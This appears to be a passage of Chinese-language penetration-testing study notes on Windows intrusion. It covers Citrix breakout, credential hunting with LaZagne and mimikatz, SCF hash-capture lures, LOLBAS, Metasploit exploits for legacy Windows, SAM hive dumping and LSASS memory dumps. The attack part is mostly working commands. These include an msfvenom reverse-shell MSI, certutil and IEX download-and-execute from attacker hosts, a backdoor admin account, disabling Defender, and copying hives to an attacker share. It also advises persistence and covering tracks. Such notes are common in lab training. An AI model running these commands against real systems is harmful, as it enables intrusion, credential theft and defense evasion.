```

* **破解成功後**：可獲得 IT 部門高權限帳號。

4️⃣ MailSniper 搜索電子郵件中的憑證

* **概念**：在 Exchange 信箱中搜尋密碼相關字眼。
* **範例**：

```
Invoke-MailSearch -Identity user -SearchQuery 'password OR creds'
```

5️⃣ LaZagne 工具

* **功能**：支援從多種軟體中提取憑證（包括瀏覽器、聊天、資料庫、系統工具等）。
* **指令**：

```
lazagne.exe all
```

6️⃣ SessionGopher 搜索 RDP、PuTTY、WinSCP 憑證

* **使用範例**：

```
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target localhost
```

7️⃣ 登錄檔自動登入憑證（Windows AutoLogon）

* **查詢路徑**：

```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
```

* **重點項目**：`DefaultUserName`、`DefaultPassword`

8️⃣ PuTTY 註冊表憑證提取

* **查詢指令**：

```
reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions
```

9️⃣ WiFi 密碼提取

* **列出儲存的 WiFi**：

```
netsh wlan show profile
```

* **取得密碼**：

```
netsh wlan show profile <SSID> key=clear
```

</details>

<details>

<summary>受限環境權限突破</summary>



1️⃣ Interacting with Users 與用戶互動

🏢 **公司化概念：** 在大型企業或受控環境中（例如 Citrix、AWS AppStream、CyberArk PSM），管理員會實施多層級鎖定策略以防範惡意行為。然而，攻擊者仍可透過利用人性弱點、視覺誘騙（如修改捷徑）、以及間接觸發（例如文件圖示抓取）等手法進行突破與提權。

🌳 **攻擊流程樹狀圖：**

```
Citrix Breakout 攻擊流程
├─ 1. 獲取 Dialog Box (MS Paint / Notepad / WordPad)
│   └─ 手動開啟 > File > Open > 利用 UNC 路徑跳轉
├─ 2. 執行 SMB 共享滲透
│   ├─ 攻擊端啟動 smbserver.py
│   └─ UNC 輸入攻擊者 share，右鍵執行 payload（pwn.exe 開啟 cmd）
├─ 3. 替代 Explorer++
│   └─ 利用可攜版瀏覽器繞過路徑限制，將工具拉到桌面
├─ 4. 修改捷徑 (.lnk) 檔案目標
│   └─ 指向 cmd.exe / 自訂 payload
├─ 5. 腳本執行（.bat/.vbs/.ps）
│   └─ 自建 evil.bat （內容：cmd）並執行取得 shell
└─ 6. 權限提升
    ├─ 使用 PowerUp.ps1 掃描 AlwaysInstallElevated
    ├─ 產生 UserAdd.msi 建立管理員帳戶
    ├─ runas 啟動 backdoor 使用者
    └─ 使用 Bypass-UAC 腳本取得最高權限
```

🔎 **詳細步驟＋範例代碼＋背後原理**



**1️⃣ 使用 Dialog Box 取得路徑突破**

* 工具：MS Paint
* 步驟：File > Open > 輸入 `\\127.0.0.1\c$\Users\pmorgan`
* 原理：UNC 路徑不受群組策略限制，可繞過鎖定
* Debug：若提示權限不足，嘗試不同工具（Notepad、Wordpad）或確認 SMB 端口開放

連線後，學生將進入受限的 Windows 7 環境。接下來，學生需要執行 `Paint` ，利用 `Open` 對話框存取 `pmorgan` 使用者目錄：

![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.35.26.png>)\




\
![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.36.36.png>)

選擇 `All Files` ，學生需要輸入 UNC 路徑 `\\127.0.0.1\c$\users\pmorgan` 作為文件名，然後按一下 `Open` ：

![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.37.16.png>)

**2️⃣ SMB 分享執行 Payload**

* 攻擊端： (WINDOWS)&#x20;

```bash
cd Tools/
sudo su
smbserver.py -smb2support share $(pwd)
```

* Citrix 端在 dialog box 輸入 `\\<AttackerIP>\share` > 右鍵執行 pwn.exe
*   因此，學生需要右鍵點擊開啟 `pwn.exe` ，從受限環境內啟動命令提示字元：

    \
    ![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.40.52.png>)
* pwn.exe 範例：

```c
#include <stdlib.h>
int main() { system("C:\\Windows\\System32\\cmd.exe"); }
```

* Debug：若無法執行，確認 SMB 是否允許 UNC 執行

**3️⃣**&#x20;

*   現在，學生需要升級到 `powershell` 會話，同時導航到 `C:\users\public` ，以便他們可以複製 `PowerUp.ps1` 和 `Bypass-UAC.ps1` 腳本：隨後，學生需要使用 `Write-UserAddMSI` cmdlet 來促進 `.msi` 檔案的建立：

    ```cmd
    powershell -ep bypass
    cd c:\users\public
    xcopy \\10.13.38.95\share\PowerUp.ps1 .
    xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
    Import-Module .\PowerUp.ps1
    Write-UserAddMSI
    ```

    \
    學生需要執行 `UserAdd.msi` ，使用憑證 `backdoor:T3st@123` 建立一個新用戶
*

    <figure><img src="../.gitbook/assets/螢幕截圖 2025-03-25 17.42.24.png" alt=""><figcaption></figcaption></figure>

    ```cmd-session
    .\userAdd.msi
    ```

現在，學生需要使用 `runas` 以後 `backdoor` 使用者身分啟動命令提示字元：![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.43.11.png>)

```cmd
runas /user:backdoor cmd
```

最後，從新建立的命令提示字元中，學生需要使用 `Bypass-UAC.ps1` 繞過 UAC：

```cmd
powershell -ep bypass
cd C:\users\public
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -method UacMethodSysprep
```

\
\
![](<../.gitbook/assets/螢幕截圖 2025-03-25 17.43.50.png>)

✅ **總結 & 下一步**

* 已完成突破受限 Citrix 環境、取得系統 Shell、完成本地提權。 👉 下一步建議：
* 使用 `whoami /all` 確認權限等級
* 將憑證或 shell 上報 Team Server (如 Cobalt Strike)
* 進行 AD Domain 橫向滲透或 Kerberos 攻擊
* 最後做好清理並移除後門，避免痕跡

🛠 **如 Debug 出錯：**

| 問題              | 檢查方法                                      |
| --------------- | ----------------------------------------- |
| 無法開啟 dialog box | 嘗試 Notepad、WordPad 或其他內建 App              |
| 無法透過 UNC 跳轉     | 確認 SMB Server 開啟、端口允許                     |
| payload 無法執行    | 確保 pwn.exe 已在 SMB 且無 AV 攔截                |
| UAC Bypass 失敗   | 換另一繞過手法 (Event Viewer, fodhelper) 並升級腳本版本 |

</details>

<details>

<summary>攻擊已知的需要用戶互動的易受攻擊的服務</summary>



1️⃣ Interacting with Users 與用戶互動

🏢 **公司化概念：** 在企業環境中，使用者經常是安全鏈中最薄弱的一環。高壓工作下容易忽略異常行為，攻擊者會利用這點透過釣魚郵件、惡意共享、滑鼠滑過的捷徑檔等技巧，從不經意的用戶互動中竊取憑證或觸發惡意行為。

🌳 **攻擊流程樹狀圖：**

```
與用戶互動取得憑證完整攻擊流程
├─ 1. 流量嗅探
│   ├─ 確認目標機是否安裝 Wireshark 或開放 Npcap
│   ├─ 使用 tcpdump、net-creds、Wireshark 捕捉敏感協定流量 (FTP, SMB)
│   └─ 分析 NTLMv2 流量以取得哈希
│
├─ 2. 監控系統命令行 (本地提權)
│   ├─ 部署 PowerShell 腳本持續監控進程
│   ├─ 偵測包含憑證的 net use、備份指令等
│   └─ 提取明文密碼
│
├─ 3. 利用脆弱服務 (CVE)
│   ├─ Docker Desktop CVE-2019-15752
│   └─ 將惡意 exe 植入 version-bin，等待服務重啟
│
├─ 4. 放置釣魚檔案
│   ├─ 創建 .scf 文件，Icon 指向攻擊者 SMB
│   ├─ 使用惡意 .lnk (可自動觸發身份驗證)
│   └─ 搭配 Responder / Inveigh 抓取雜湊
│
└─ 5. 雜湊破解 & 後續行動
    ├─ 使用 hashcat 破解 NTLMv2
    ├─ 利用明文進行 RDP/WinRM 嘗試
    └─ 進行 AD 橫向滲透
```

🔎 **詳細步驟範例＋背後原理說明：**

**（1）Wireshark 嗅探明文憑證**

* 指令：

```bash
sudo wireshark 或 sudo tcpdump -i eth0
```

* 原理：部分老舊服務（FTP、Telnet）以明文傳遞帳密，可直接攔截
* Debug：若抓不到流量，確認是否有 npcap 設定或防火牆阻擋

**（2）**&#x65B0;的終端選項卡中啟動 `Responder` 並開始監聽 `tun0` 介面：

* 指令範例：

```powershell
sudo apt-get install responder
sudo responder -wrf -v -I tun0
```

* 原理：監聽突發命令行中可能包含帳號密碼的 net use 或備份指令
* Debug：若無結果，確認目標有無 PowerShell 權限與遠端連線策略

**（3）放置 SCF 文件**

* 內容範例：
* 開啟 `Notepad`

```ini
[Shell]
Command=2
IconFile=\\<attackerIP>\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop
```

* 然後，需要點擊 `File` -> `Save As` ，並使用文件資源管理器導航到 `C:\Department Shares\Public\IT` 並將文件儲存為 `@Inventory.scf` ：
* 原理：Windows Explorer 讀取 icon 時觸發 NTLM 認證
* Debug：若無反應，檢查 SMB 是否正常服務，以及路徑拼寫

**（5）使用 Hashcat 破解 NTLMv2**

* 指令：

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

* Debug：如速度過慢，可調整 --force、加大 threads

🛠 **如果 Debug 出錯怎麼辦？**

* Wireshark 抓不到封包：改用 tcpdump 並確認鏡像埠是否開啟
* Responder 無法觸發：確認路徑拼寫、用戶是否瀏覽過該目錄
* PowerShell 腳本報錯：確認 Execution Policy 並加上 `Set-ExecutionPolicy Bypass`。
* Hashcat 速度太慢：加入 GPU，或使用 mask 攻擊。

✅ **最終總結 & 下一步建議** 你現在已經掌握企業環境中「利用用戶行為取得憑證」的完整流程，包括：

* 如何在未授權情境中進行主動或被動捕獲
* 如何利用 SMB、SCF/LNK 文件引誘認證
* 如何利用取得的 NTLM 哈希進行破解並進行下一步橫向滲透

👉 下一步：

* 配合 CrackMapExec、pth-winexe 等工具，實際進行 Pass-The-Hash 測試
* 利用已破解帳號嘗試 AD 域控制器或高權限主機
* 確立持久化（如註冊表後門、Scheduled Task）並隱蔽痕跡。

</details>

<details>

<summary>Pillaging 掠奪</summary>

1️⃣ Pillaging 掠奪指南

🏢 **公司化概念：** 在滲透過程中，取得系統控制權只是開始，真正關鍵是掠奪（Pillaging）階段——透過系統中各種資訊（憑證、設定檔、敏感文件、備份、cookie、應用程式配置等）來獲得橫向移動或提權的突破口。

🌳 **攻擊流程樹狀圖：**

```
Pillaging 攻擊流程
├─ 1. 確認環境 (whoami /all、hostname)
├─ 2. 應用程式調查
│   ├─ dir / ls 查看 Program Files
│   └─ PowerShell 查註冊表安裝紀錄
├─ 3. 敏感配置檔案蒐集
│   ├─ mRemoteNG confCons.xml
│   ├─ SQL、RDP、FTP 配置檔案
│   └─ 常見路徑如 %AppData%、Documents
├─ 4. Browser Cookie 提取
│   ├─ Firefox: cookies.sqlite
│   ├─ Chromium: SharpChromium 工具
│   └─ 利用 cookie 編輯器登入
├─ 5. 剪貼簿監控 (Clipboard)
│   └─ Invoke-ClipboardLogger 捕捉憑證
├─ 6. 備份系統掠奪
│   ├─ 找尋 restic 等備份系統
│   ├─ 還原 / 破解出帳號或憑證
│   └─ 利用 AD 配置與系統快照
└─ 7. 橫向移動 & 提權
    ├─ 使用 Harvested 憑證進行 Pass-the-Hash
    ├─ Kerberos Ticket 重用
    └─ PowerUp、WinPEAS 搜尋可用漏洞
```

🔎 **詳細步驟＋範例代碼＋背後原理**

**1️⃣ 應用程式與服務調查**

* cmd:

```cmd
 dir "C:\Program Files" 
```

* PowerShell:

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
$INSTALLED | ?{$_.DisplayName -ne $null} | Sort DisplayName | Format-Table -AutoSize
```

* 原理：找出系統已安裝的遠端管理工具、DB、瀏覽器等潛在敏感目標。

**2️⃣ mRemoteNG 配置檔案解密**

* 預設路徑：`%APPDATA%\mRemoteNG\confCons.xml`
* Python 解密腳本範例：

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p mR3m
```

* 若有自訂密碼，透過字典攻擊：

```bash
for pw in $(cat /usr/share/wordlists/rockyou.txt); do python3 mremoteng_decrypt.py -s <hash> -p $pw; done
```

**3️⃣ Cookie 掠奪範例（Slack）**

* Firefox 路徑：`%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`
* 提取：

```bash
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```

* 複製 cookie 至 Cookie-Editor 外掛，重建 session。

**4️⃣ Clipboard 截取**

* PowerShell 啟用：

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

* 等待敏感文字出現，例如密碼或 TOTP。

**5️⃣ 備份系統滲透 (Restic 範例)**

* 驗證快照：

```powershell
restic.exe -r E:\restic2\ snapshots
```

* 還原備份：

```powershell
restic.exe -r E:\restic2\ restore <snapshot_id> --target C:\Restore
```

* 關鍵目標：Linux 找 /etc/shadow、id\_rsa；Windows 找 SAM、SYSTEM hive 及 web.config。

✅ **小結 & 下一步建議**

* 已完成系統資源掠奪
* 下一步：
  * 利用取得的憑證進行橫向滲透
  * 使用 mimikatz 進行進階憑證擷取
  * 利用 AD 分析工具 BloodHound 繪製橫向圖譜
  * 持續監控 clipboard 和網路流量

🛠 **Debug 出錯處理表**

| 問題               | 解決方式                                          |
| ---------------- | --------------------------------------------- |
| 找不到 confCons.xml | 切換目標帳號 AppData 或尋找 Portable 版本                |
| Cookie 解密失敗      | 確認 chromium 路徑；嘗試 SharpChromium 反射執行          |
| 備份還原失敗           | 測試 repository password 或使用 volume shadow copy |
| clipboard 無反應    | 確認 PowerShell Execution Policy 設定為 Bypass     |

</details>

<details>

<summary>「Windows 系統原生二進位檔案」執行惡意行為</summary>

🏢 **公司化概念**

**Living Off The Land Binaries and Scripts (LOLBAS)** 是針對企業環境滲透測試中必備的重要技巧。它代表攻擊者不使用第三方工具，而是利用系統原生已存在的微軟簽署工具來達成攻擊行為，目的是：

* 繞過端點防禦系統 (EDR)
* 降低可疑行為監測
* 提高隱匿度與長期存活
* 應用於高安全政策環境

***

🌳 **攻擊流程樹狀圖**

```
初始階段
│
├─ 信息收集
│   ├─ nmap 掃描
│   ├─ SMB、RPC 枚舉
│   └─ PowerView / AD Enumeration
│
├─ 利用階段
│   ├─ 利用可用 LOLBAS 工具
│   │   ├─ certutil 傳檔 & base64 編解碼
│   │   ├─ rundll32 執行惡意 DLL
│   │   └─ msiexec 配合 AlwaysInstallElevated 提權
│   └─ 若失敗 → 嘗試其他提權 (計劃任務、服務弱點、漏洞利用)
│
├─ 後滲透階段
│   ├─ 建立持久性 (後門、計劃任務、自啟 DLL)
│   ├─ 憑證收集 (Mimikatz、LSASS Dump)
│   └─ 橫向移動 (Pass-the-Hash、Kerberos 攻擊)
│
└─ 報告紀錄與清除痕跡
```

***

🔎 **詳細步驟＋範例代碼＋背後原理**

#### 1️⃣ 使用 certutil 傳輸文件

* **原理**：certutil.exe 原本為憑證管理工具，但具有 URL 下載與 base64 編解碼功能
* **範例**：

```powershell
certutil.exe -urlcache -split -f http://<你的IP>:8080/shell.exe shell.exe
```

* **結果**：shell.exe 將被下載到本地
* **Debug 方法**：
  * 檢查 IP/PORT
  * 測試連線（ping 或 curl）
  * 確認 IIS/HTTP Server 有啟動

#### 2️⃣ certutil 編碼 & 解碼

* **原理**：以 base64 格式在文字中傳遞可執行檔案以規避攔截
* **編碼**：

```powershell
certutil -encode payload.exe payload.txt
```

* **解碼**：

```powershell
certutil -decode payload.txt payload.exe
```

* **Debug 方法**：
  * 檢查 txt 文件完整性
  * 若解碼失敗，手動檢查文件是否被截斷

#### 3️⃣ 檢查 AlwaysInstallElevated 權限

* **原理**：若系統與使用者同時啟用，任何 MSI 安裝包將以 SYSTEM 權限執行
* **檢查指令**：

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

* **Debug 方法**：
  * 若鍵值不存在或為 0，表示無此漏洞

#### 4️⃣ 生成惡意 MSI

* **原理**：利用 msfvenom 生成含反向連線 Payload 的 MSI 文件
* **範例**：

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<你的IP> LPORT=4444 -f msi > evil.msi
```

* **Debug 方法**：
  * 確保 listener 有正確開啟 (nc -lvnp 4444)
  * 測試反向連線可通

#### 5️⃣ 執行 MSI 提權

* **範例**：

```powershell
msiexec /i C:\path\to\evil.msi /quiet /qn /norestart
```

* **Debug 方法**：
  * 若無回連，確認防火牆、AV 是否攔截
  * 確認目標主機是否允許執行 MSI

***

🛠 **如果 Debug 出錯怎麼辦？**

| 問題                          | Debug 策略                                          |
| --------------------------- | ------------------------------------------------- |
| certutil 無法下載               | 驗證 URL 是否通；用 curl 測試；檢查 proxy/firewall 設定         |
| MSI 沒反向 shell               | 檢查 msfconsole listener；重新產生 payload；確認 Port 有無被占用 |
| AlwaysInstallElevated 為 0x0 | 尋找其他提權途徑，如計畫任務弱權限或 DLL 劫持                         |
| payload 被 AV 刪除             | 嘗試加殼 (obfuscation)、修改載體；或使用其他 LOLBAS              |

***

</details>

<details>

<summary>Windows Server 2008</summary>

🏢 **公司化概念**

Windows Server 2008 相對於 Server 2016/2019 缺乏多項現代防護技術（如 ATP、Credential Guard、Control Flow Guard）。對攻擊者來說，這是經典滲透切入點，因為：

* 補丁不全
* 缺乏現代保護機制
* 容易發現漏洞並利用（例如 MS10-092、MS17-010）
* 通常被用於關鍵業務而難以汰換

***

🌳 **攻擊流程樹狀圖**

```
1. 系統版本確認
   └─ nmap、SMB banner 確認版本
2. 安全更新狀態檢查
   ├─ wmic qfe
   └─ Sherlock / Windows-Exploit-Suggester
3. 遠端漏洞利用（若存在）
   ├─ EternalBlue
   └─ SMB Delivery
4. 建立初步 Meterpreter 回連
5. 本地提權
   ├─ MS10-092（任務計劃 XML 漏洞）
   └─ MS16-032、MS15-051 等
6. 收集敏感資料、橫向移動
```

***

🔎 **每一步詳細步驟＋代碼＋背後原理**

#### 1️⃣ 系統版本確認

**原理**：通過偵測回應中的 OS Banner、或 SMB 與 RDP banner 確定目標系統

```bash
nmap -sV -O -p 135,139,445,3389 <IP>
smbclient -L //<IP> -N
```

**輸出結果範例**：Windows Server 2008 R2 Detected

#### 2️⃣ 安全更新狀態檢查

**原理**：透過 `wmic qfe` 列出已安裝 KB，或使用 Sherlock.ps1 找缺失修補

```powershell
wmic qfe
Import-Module .\Sherlock.ps1
Find-AllVulns
```

**結果**：顯示出如 MS10-092、MS16-032 尚未修補

#### 3️⃣ 利用 SMB Delivery 取得 Meterpreter

**原理**：透過 SMB 模組傳遞 DLL，利用 rundll32 觸發遠端執行

```bash
use exploit/windows/smb/smb_delivery
set LHOST <攻擊機 IP>
exploit
```

然後在目標機上執行：

```bash
rundll32.exe \\<attacker-ip>\<share>\test.dll,0
```

**結果**：回連 Meterpreter Shell

#### 4️⃣ 提權（MS10-092 範例）

**原理**：利用任務計劃 XML 設定弱點提權

```bash
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <攻擊機 IP>
set LPORT 4443
exploit
```

**結果**：取得 NT AUTHORITY\SYSTEM 權限

***

🛠 **如果 Debug 出錯怎麼辦？**

| 問題               | Debug 策略                                |
| ---------------- | --------------------------------------- |
| SMB delivery 無回連 | 檢查防火牆、IP 設定是否正確、確認 SMB 445 port 開放      |
| Sherlock 執行失敗    | 使用 Set-ExecutionPolicy bypass 或確認 PS 權限 |
| 提權失敗             | 確認已遷移至 64-bit 進程；檢查漏洞適用條件               |
| rundll32 指令無效    | 檢查路徑拼寫、SMB 共享是否正常、或改用 PowerShell 執行     |

***



</details>

<details>

<summary>Windows 7</summary>

🏢 **公司化概念**

Windows 7 同樣缺乏現代 Windows 10 提供的防護技術（如 MFA、多層憑證保護、Device Guard、Control Flow Guard）。在滲透測試中，Windows 7 系統仍廣泛存在於許多產業環境中（如醫療、零售、金融、政府部門），且通常難以淘汰，這成為攻擊者最容易取得系統控制權的入口。

***

🌳 **攻擊流程樹狀圖（Windows 7）**

```
1. 系統版本確認
   └─ nmap、SMB/RDP banner 確認版本
2. 收集補丁狀態
   ├─ systeminfo
   ├─ wmic qfe
   └─ Windows-Exploit-Suggester / Sherlock
3. 遠端或本地漏洞利用
   ├─ EternalBlue (若 SMB 存在)
   └─ Exploit SMB Delivery 模組傳遞
4. 建立 Meterpreter 反向連線
5. 本地提權
   ├─ MS16-032 (二次登入提權)
   ├─ MS15-051、Hot Potato (Rotten Potato)
   └─ 其他本地提權模組
6. 擷取敏感檔案、提取憑證、橫向移動
```

***

🔎 **詳細步驟＋範例代碼＋原理**

#### 1️⃣ 系統版本確認

**原理**：利用掃描與 SMB/RDP banner 判別系統版本

```bash
nmap -sV -O -p 135,139,445,3389 <目標IP>
smbclient -L //<目標IP> -N
```

**預期結果**：顯示 Windows 7 Professional / Enterprise 系統

#### 2️⃣ 安全更新狀態檢查

**原理**：使用 systeminfo 輸出結合 Windows-Exploit-Suggester 自動判斷缺少的安全更新

```bash
systeminfo > sysinfo.txt
python2 windows-exploit-suggester.py --database <最新xls檔> --systeminfo sysinfo.txt
```

**結果**：列出潛在漏洞（如 MS16-032、MS15-051）

#### 3️⃣ 建立初步反向 shell

**方式**：可透過社交工程傳送 payload 或使用 SMB Delivery 模組

```bash
use exploit/windows/smb/smb_delivery
set LHOST <攻擊機IP>
exploit
```

目標主機執行：

```bash
rundll32.exe \\<攻擊機IP>\<隨機路徑>\test.dll,0
```

#### 4️⃣ 本地提權 - MS16-032 利用範例

**原理**：透過 Windows 二次登入服務設計缺陷取得 SYSTEM 權限

```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

**結果**：成功產生 NT AUTHORITY\SYSTEM 權限的命令列介面

***

🛠 **如果 Debug 出錯怎麼辦？**

| 問題                           | Debug 解決方法                                        |
| ---------------------------- | ------------------------------------------------- |
| 沒偵測到 OS 版本                   | 使用 `smbclient`、`rdp banner`，或 Nessus 進行資安掃描驗證     |
| Windows-Exploit-Suggester 出錯 | 更新 Python 依賴，或手動比對 systeminfo 與 MS 安全公告           |
| PowerShell 腳本無法執行            | 確認 Set-ExecutionPolicy 是否設為 bypass 或 unrestricted |
| exploit 模組失敗                 | 確認 Metasploit 為最新版，或改用手動 PoC 執行                   |

***



</details>

<details>

<summary><span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span>憑證獵殺</summary>



## ✅ A. 檔案系統搜尋

#### 📍操作一：使用 Windows GUI 搜尋

打開 RDP 或遠端桌面 → 點搜尋欄 → 輸入以下關鍵詞逐一搜尋：

```
password
credentials
dbpassword
login
pwd
key
config
vpn
pass.txt
passwords.xlsx
unattend.xml
```

🔍 特別注意目錄：

* `C:\Users\*\Desktop`
* `C:\Users\*\Downloads`
* `C:\Users\*\Documents`
* `C:\IT\`、`C:\Scripts\`、`C:\Temp\`

***

#### 📍操作二：PowerShell 全磁碟掃描

```powershell
Get-ChildItem -Path C:\ -Include *pass*,*cred*,*key*,*config*,*vpn*,*.kdbx -Recurse -ErrorAction SilentlyContinue | Out-File C:\loot.txt
```

這會找出所有可能含有憑證的檔案，結果存在 `loot.txt`

***

#### 📍操作三：CMD 使用 findstr 搜尋文字檔內容

```cmd
cd C:\
findstr /SIM /C:"password" *.txt *.ini *.config *.xml *.ps1 *.bat *.yml
```

🔍 /S → 遞迴目錄\
🔍 /I → 忽略大小寫\
🔍 /M → 只顯示有關鍵字的檔名\
🔍 /C:"..." → 搜尋確切字串

***

### 🧠 為什麼這樣做？

使用者經常會：

* 用文字檔紀錄帳密（尤其是 IT 人員）
* 把設定檔放桌面或下載資料夾
* 遺留瀏覽器快取資料或自動登入設定

***

## ✅ B. 使用 Lazagne 擷取應用程式憑證

#### 🔧 工具下載位置：

[https://github.com/AlessandroZ/LaZagne/releases](https://github.com/AlessandroZ/LaZagne/releases)

建議下載 `lazagne.exe` (standalone version)

#### 📍傳送方式：

如果你是 RDP 存取，**直接拖拉複製到桌面即可**\
或使用 PowerShell 下載：

```powershell
Invoke-WebRequest -Uri http://10.10.14.3/lazagne.exe -OutFile C:\Users\bob\Desktop\lazagne.exe
```

#### 📍執行命令：

```cmd
cd C:\Users\bob\Desktop
start lazagne.exe all -vv
```

`-vv`：顯示詳細資訊（你會看到它跑過 browser, git, RDP, FTP, Chrome 等）

***

#### 📤 常見輸出樣例：

```
########## User: bob ##########
------------------- WinSCP passwords -----------------
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

***

#### 🧨 Debug 錯誤排查：

| 問題              | 解法                                                                |
| --------------- | ----------------------------------------------------------------- |
| Defender 阻擋執行   | 暫時關閉 Defender：`Set-MpPreference -DisableRealtimeMonitoring $true` |
| 缺少 VC++ runtime | 從網路傳送 VC++ Redistributable Installer                              |
| 執行沒有輸出          | 確認用 `-vv`，並用 `start` 開新視窗執行                                       |

***

## ✅ C. 特殊敏感檔案位置搜尋

#### 📍 unattended.xml、Group Policy

這類檔案常含密碼（部署時設定用）

```powershell
Get-ChildItem -Path C:\ -Include *unattend.xml*,*groups.xml* -Recurse -ErrorAction SilentlyContinue
```

檢查內容：

```powershell
type C:\Windows\Panther\unattend.xml
```

***

#### 📍 SYSVOL Group Policy 密碼（只限 domain 環境）

```
\\domain-controller\SYSVOL\domain\Policies\
```

搜尋 `Groups.xml` 檔案，內有加密的密碼欄位（可用 GPPDecrypt 工具解密）

***

#### 📍 KeePass 檔案

```powershell
Get-ChildItem -Recurse -Include *.kdbx -Path C:\Users
```

拉回後用 `keepass2john` 抽 hash，`john` 破解

***

## ✅ D. 記憶體憑證 & Mimikatz

#### 📍操作：

```cmd
.\mimikatz.exe
privilege::debug
log
sekurlsa::logonpasswords
```

⚠️ 需要高權限（系統或管理員）

🔐 你可能看到：

```
Username : Administrator
Password : Winter2024!
```

***

### 🧪 記憶體轉儲 + 離線分析方式：

```cmd
tasklist | findstr lsass
rundll32.exe comsvcs.dll, MiniDump 1234 C:\lsass.dmp full
```

將 dump 傳回用 mimikatz 或 strings 搜索

***

## ✅ E. 其他有趣地方（補充）

#### ✅ PowerShell 歷史記錄：

```powershell
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

***

#### ✅ 瀏覽器密碼擷取（Nirsoft 工具）

* `WebBrowserPassView.exe`
* `MailPassView.exe`
* `RemoteDesktopPassView.exe`

***

#### ✅ 登錄檔搜尋：

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query HKLM /f password /t REG_SZ /s
```

</details>









## **🎯 3.  準備/橫向移動**

**當你係Admin嘅時候 可以重複上邊以上提供嘅步驟 盡力攞到hash  可以使用**Mimikatz呢啲工具 之前試過可以試SeDebugPrivilege 呢個攻擊 之後你就登入其他windows 增加攻擊鍵

<details>

<summary>SAM 攻擊</summary>

## 🏢 公司內網潛透實戰教學：SAM 雜款推印與破解教程

***

### 🌟 想實現的目標：

* 從目標 Windows 主機中 dump 出 SAM、SYSTEM、SECURITY Hive
* 利用 secretsdump.py 解 NTLM Hash
* 用 hashcat 破解 Hash 獲得明文密碼
* 利用密碼進行橫向移動或接續潛透

***

### ✅ 先準條件

| 項目         | 說明                                  |
| ---------- | ----------------------------------- |
| SYSTEM權限   | 必須是本機管理員（可以使用 reg save 存取 Hive）     |
| Kali Linux | 裝有 Impacket、hashcat、rockyou.txt 字幕檔 |
| SMB 共享     | 可使用 smbserver.py 封裝故件供 Windows 抓取   |
| 標的目標       | 可連線的 Windows 10/11 工作站              |

***

### ㄧ、從 Windows 目標匯出 Hive

```cmd
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
reg save HKLM\SECURITY C:\security.save
```

***

### 二、Kali Linux 上啟用 SMB 供應

```bash
mkdir -p ~/smbshare
cd ~/smbshare
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $(pwd)
```

***

### 三、從 Windows 機器抓回 Hive

```cmd
move C:\sam.save \\<KALI-IP>\CompData
move C:\system.save \\<KALI-IP>\CompData
move C:\security.save \\<KALI-IP>\CompData
```

***

### 四、解 NTLM Hash

```bash
cd ~/smbshare
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save  -security security.save -system system.save LOCAL | grep -E "^[a-zA-Z0-9_-]+:[0-9]{3,5}:" \
| awk -F: '{print  $4}' | sort -u >  ntlm_hashes.txt
```

預期輸出：

```txt
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
```

***

### 六、解壓 rockyou.txt

```bash
find / -iname rockyou.txt 
```

***

### 七、破解 Hash

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt --force -O --backend-ignore-opencl
```

預期輸出：

```txt
3c0e5d303ec84884ad5c3b7876a06ea6:Password123
```

***

### 八、橫向移動 / 使用密碼

```bash
crackmapexec smb 10.129.202.137 -u bob -p Password123
```

預期：

```
[+] bob:Password123 (Pwn3d!)
```

***

</details>

<details>

<summary>攻擊 LSASS</summary>



### 攻擊 LSASS 全流程指南

#### 一、攻擊目標概念

LSASS（Local Security Authority Subsystem Service）是 Windows 系統負責身份驗證、授權與憑證管理的核心服務。只要使用者登入，LSASS 就會在記憶體中快取密碼（明文或雜湊）、Kerberos 票證、DPAPI 金鑰等資訊。

攻擊者可藉由**轉儲 LSASS 記憶體內容（lsass.dmp）**，離線分析其中的憑證，進而達成橫向移動、特權提升或帳密破解。

***

#### 二、步驟一：建立 lsass.dmp 記憶體轉儲

**方法一：任務管理員（GUI）**

1. 開啟 Task Manager
2. 找到 `lsass.exe`
3. 右鍵 > Create Dump File
4. 檔案儲存於：`C:\Users\<使用者>\AppData\Local\Temp\lsass.DMP`

